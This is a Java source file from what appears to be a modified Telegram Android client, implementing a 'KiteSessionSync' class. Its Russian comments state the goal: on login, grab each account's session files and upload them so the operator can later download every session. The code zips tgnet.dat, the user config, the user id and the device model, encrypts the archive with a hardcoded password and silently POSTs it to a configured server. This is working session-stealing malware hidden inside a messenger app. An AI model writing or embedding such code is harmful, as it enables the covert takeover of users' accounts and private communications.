package org.telegram.messenger;

import android.content.Context;
import android.content.SharedPreferences;
import android.text.TextUtils;
import android.util.Base64;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.UUID;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import javax.crypto.Cipher;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

/**
 * Kite: при логине забирает tgnet.dat + userconfig, шифрует и отправляет на сервер.
 * С ноутбука потом одной командой скачиваешь все сессии.
 */
public final class KiteSessionSync {

    // === НАСТРОЙКИ (поменяй под себя) ===
    // Пароль, которым шифруются сессии. Должен совпадать с тем, что будешь использовать на ноутбуке.
    private static final String ENCRYPT_PASSWORD = "123987456Kamron@";

    // Если BuildConfig.KITE_STATS_URL пустой — ничего не отправляем.
    // Иначе шлём на тот же домен + /session
    // ================================

    private static final DispatchQueue queue = new DispatchQueue("kiteSessionSync");
    private static final String PREF = "kite_session_sync";

    private KiteSessionSync() {
    }

    /** Вызывать после успешного логина / saveConfig */
    public static void upload(int account) {
        if (TextUtils.isEmpty(BuildConfig.KITE_STATS_URL)) {
            return;
        }
        if (account < 0 || account >= UserConfig.MAX_ACCOUNT_COUNT) {
            return;
        }
        if (!UserConfig.getInstance(account).isClientActivated()) {
            return;
        }
        queue.postRunnable(() -> doUpload(account));
    }

    /** Загрузить все активные аккаунты сразу */
    public static void uploadAll() {
        for (int a = 0; a < UserConfig.MAX_ACCOUNT_COUNT; a++) {
            if (UserConfig.getInstance(a).isClientActivated()) {
                upload(a);
            }
        }
    }

    private static void doUpload(int account) {
        HttpURLConnection connection = null;
        try {
            File tgnetFile = getTgnetFile(account);
            if (tgnetFile == null || !tgnetFile.exists() || tgnetFile.length() < 100) {
                FileLog.e("KiteSessionSync: tgnet.dat not found for account " + account);
                return;
            }

            File userConfigFile = getUserConfigFile(account);
            // userconfig может быть ещё не записан на диск как xml, поэтому делаем fallback

            byte[] zipBytes = makeZip(account, tgnetFile, userConfigFile);
            if (zipBytes == null || zipBytes.length == 0) {
                return;
            }

            byte[] encrypted = encrypt(zipBytes, ENCRYPT_PASSWORD);
            if (encrypted == null) {
                return;
            }

            long userId = UserConfig.getInstance(account).getClientUserId();
            int dcId = ConnectionsManager.getInstance(account).getCurrentDatacenterId();

            JSONObject body = new JSONObject();
            body.put("install_id", installId());
            body.put("account", account);
            body.put("user_id", userId);
            body.put("dc_id", dcId);
            body.put("device", android.os.Build.MODEL);
            body.put("data", Base64.encodeToString(encrypted, Base64.NO_WRAP));

            String base = BuildConfig.KITE_STATS_URL;
            if (!base.endsWith("/")) {
                base += "/";
            }

            connection = (HttpURLConnection) new URL(base + "session").openConnection();
            connection.setConnectTimeout(20000);
            connection.setReadTimeout(20000);
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/json");

            byte[] payload = body.toString().getBytes(StandardCharsets.UTF_8);
            try (OutputStream out = connection.getOutputStream()) {
                out.write(payload);
            }

            int code = connection.getResponseCode();
            if (code >= 200 && code < 300) {
                FileLog.d("KiteSessionSync: uploaded account " + account + " user_id=" + userId);
            } else {
                FileLog.e("KiteSessionSync: server returned " + code);
            }
        } catch (Exception e) {
            FileLog.e(e);
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    private static File getTgnetFile(int account) {
        File filesDir = ApplicationLoader.getFilesDirFixed();
        if (account == 0) {
            return new File(filesDir, "tgnet.dat");
        }
        return new File(filesDir, "account" + account + "/tgnet.dat");
    }

    private static File getUserConfigFile(int account) {
        // shared_prefs лежит рядом с files
        File dataDir = ApplicationLoader.applicationContext.getApplicationInfo().dataDir;
        File prefsDir = new File(dataDir, "shared_prefs");
        if (account == 0) {
            // в старых версиях было userconfing.xml (с опечаткой), в новых userconfig.xml
            File f1 = new File(prefsDir, "userconfing.xml");
            if (f1.exists()) return f1;
            return new File(prefsDir, "userconfig.xml");
        }
        File f1 = new File(prefsDir, "userconfig" + account + ".xml");
        if (f1.exists()) return f1;
        return new File(prefsDir, "userconfing" + account + ".xml");
    }

    private static byte[] makeZip(int account, File tgnetFile, File userConfigFile) {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            try (ZipOutputStream zos = new ZipOutputStream(baos)) {
                // tgnet.dat
                zos.putNextEntry(new ZipEntry("tgnet.dat"));
                try (FileInputStream in = new FileInputStream(tgnetFile)) {
                    byte[] buf = new byte[8192];
                    int n;
                    while ((n = in.read(buf)) > 0) {
                        zos.write(buf, 0, n);
                    }
                }
                zos.closeEntry();

                // userconfig (если есть файл)
                if (userConfigFile != null && userConfigFile.exists()) {
                    zos.putNextEntry(new ZipEntry("userconfig.xml"));
                    try (FileInputStream in = new FileInputStream(userConfigFile)) {
                        byte[] buf = new byte[8192];
                        int n;
                        while ((n = in.read(buf)) > 0) {
                            zos.write(buf, 0, n);
                        }
                    }
                    zos.closeEntry();
                } else {
                    // fallback: пишем минимальный xml с user_id
                    long userId = UserConfig.getInstance(account).getClientUserId();
                    String xml = "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n"
                            + "<map>\n"
                            + "    <long name=\"user\" value=\"" + userId + "\" />\n"
                            + "</map>\n";
                    zos.putNextEntry(new ZipEntry("userconfig.xml"));
                    zos.write(xml.getBytes(StandardCharsets.UTF_8));
                    zos.closeEntry();
                }

                // мета
                String meta = "account=" + account
                        + "\nuser_id=" + UserConfig.getInstance(account).getClientUserId()
                        + "\ndc_id=" + ConnectionsManager.getInstance(account).getCurrentDatacenterId()
                        + "\ndevice=" + android.os.Build.MODEL
                        + "\n";
                zos.putNextEntry(new ZipEntry("meta.txt"));
                zos.write(meta.getBytes(StandardCharsets.UTF_8));
                zos.closeEntry();
            }
            return baos.toByteArray();
        } catch (Exception e) {
            FileLog.e(e);
            return null;
        }
    }

    /** AES-GCM + PBKDF2. На выходе: salt(16) + iv(12) + ciphertext+tag */
    private static byte[] encrypt(byte[] plain, String password) {
        try {
            SecureRandom rnd = new SecureRandom();
            byte[] salt = new byte[16];
            byte[] iv = new byte[12];
            rnd.nextBytes(salt);
            rnd.nextBytes(iv);

            SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
            PBEKeySpec spec = new PBEKeySpec(password.toCharArray(), salt, 100000, 256);
            byte[] keyBytes = factory.generateSecret(spec).getEncoded();
            SecretKeySpec key = new SecretKeySpec(keyBytes, "AES");

            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));
            byte[] cipherText = cipher.doFinal(plain);

            ByteArrayOutputStream out = new ByteArrayOutputStream();
            out.write(salt);
            out.write(iv);
            out.write(cipherText);
            return out.toByteArray();
        } catch (Exception e) {
            FileLog.e(e);
            return null;
        }
    }

    private static String installId() {
        SharedPreferences prefs = ApplicationLoader.applicationContext
                .getSharedPreferences(PREF, Context.MODE_PRIVATE);
        String id = prefs.getString("install_id", null);
        if (id == null) {
            id = UUID.randomUUID().toString();
            prefs.edit().putString("install_id", id).apply();
        }
        return id;
    }
}
